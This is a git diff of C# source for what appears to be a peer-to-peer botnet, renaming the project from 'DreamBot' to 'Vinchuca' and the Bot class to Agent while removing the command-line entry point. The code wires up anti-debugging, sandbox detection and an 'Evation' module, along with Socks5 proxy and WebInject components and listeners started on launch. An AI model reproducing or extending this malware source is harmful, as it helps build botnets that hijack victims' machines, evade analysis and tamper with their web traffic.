@@ -1,91 +1,26 @@
 using System;
 using System.Collections.Generic;
-using System.ComponentModel.Design;
 using System.Diagnostics;
-using DreamBot.Actions.Socks5;
-using DreamBot.Actions.WebInject;
-using DreamBot.Crypto;
-using DreamBot.Network;
-using DreamBot.Network.Comunication;
-using DreamBot.Network.Comunication.Listeners;
-using DreamBot.Network.Listeners;
-using DreamBot.Network.Protocol.Handlers;
-using DreamBot.Network.Protocol.Handlers.Command;
-using DreamBot.Network.Protocol.Messages;
-using DreamBot.Network.Protocol.Messages.Command;
-using DreamBot.Network.Protocol.Messages.System;
-using DreamBot.Network.Protocol.Peers;
-using DreamBot.System.Evation;
-using DreamBot.Workers;
-using MessageType = DreamBot.Network.Protocol.Messages.MessageType;
+using Vinchuca.Actions.Socks5;
+using Vinchuca.Actions.WebInject;
+using Vinchuca.Network;
+using Vinchuca.Network.Comunication;
+using Vinchuca.Network.Comunication.Listeners;
+using Vinchuca.Network.Listeners;
+using Vinchuca.Network.Protocol.Handlers;
+using Vinchuca.Network.Protocol.Handlers.Command;
+using Vinchuca.Network.Protocol.Messages;
+using Vinchuca.Network.Protocol.Messages.Command;
+using Vinchuca.Network.Protocol.Messages.System;
+using Vinchuca.Network.Protocol.Peers;
+using Vinchuca.System.Evation;
+using Vinchuca.Workers;
 
-namespace DreamBot
+namespace Vinchuca
 {
-    public class Bot
+    public class Agent
     {
-        public static void Main(string[] args)
-        {
-            var idbuf = new byte[16];
-            new Random().NextBytes(idbuf);
-
-            var id = new BotIdentifier(idbuf);
-            var listenPort = 33333;
-            var peers = new List<PeerInfo>();
-
-            foreach (var arg in args)
-            {
-                var v = arg.Substring(1);
-                switch (arg[0])
-                {
-                    case 'p':
-                        int.TryParse(v, out listenPort);
-                        break;
-                    case 'c':
-                        foreach (var peerInfo in v.Split(new[]{';'}))
-                        {
-                            peers.Add(PeerInfo.Parse(peerInfo));
-                        }
-                        break;
-                    case 'i':
-                        id = BotIdentifier.Parse(v);
-                        break;
-                }
-            }
-
-#if !DEBUG
-            SystemInfo.CheckIfAlreadyRunning(id);
-            AntiDebugging.CheckDebugger();
-            SandboxDetection.CheckIfSandboxed();
-#endif
-
-            _bot = new Bot(listenPort, id);
-            _bot.Run();
-            _bot.Bootstrap(peers);
-            var c = Console.ReadKey(true);
-            while(c.Key != ConsoleKey.Spacebar)
-            {
-                _bot.Debug(c.Key);
-                c = Console.ReadKey(true);
-            }
-        }
-
-        private void Debug(ConsoleKey key)
-        {
-            switch (key)
-            {
-                case ConsoleKey.L:
-                    _peerList.Dump();
-                    break;
-                case ConsoleKey.Help:
-                    //Help();
-                    break;
-                case ConsoleKey.C:
-                    //_peerList.Clear();
-                    break;
-            }
-        }
-
-        private static Bot _bot;
+        private static Agent _bot;
         private readonly CommunicationManager _communicationManager;
         private readonly IMessageListener _listener;
         private readonly IWorkScheduler _worker;
@@ -97,10 +32,10 @@ namespace DreamBot
 
         private static readonly Log Logger = new Log(new TraceSource("BOT", SourceLevels.Verbose));
 
-        public Bot(int port, BotIdentifier id)
+        public Agent(int port, BotIdentifier id)
         {
             BotIdentifier.Id = id;
-            Logger.Info("DreamBot [id: {0}] listenning on port {1}", BotIdentifier.Id, port);
+            Logger.Info("Vinchuca [id: {0}] listenning on port {1}", BotIdentifier.Id, port);
 
             _worker = ClientWorker.Instance;
             _worker.QueueForever(AntiDebugging.CheckDebugger, TimeSpan.FromSeconds(1));
@@ -218,12 +153,12 @@ namespace DreamBot
 
         public void Run()
         {
-            Logger.Info("Starting DreamBot");
+            Logger.Info("Starting Vinchuca");
             _worker.Start();
             _listener.Start();
             _socks5.Start();
             _https.Start();
-            Logger.Info("DreamBot is running ;)");
+            Logger.Info("Vinchuca is running ;)");
         }
 
         private void EnqueueMessage(object sender, UdpPacketReceivedEventArgs e)
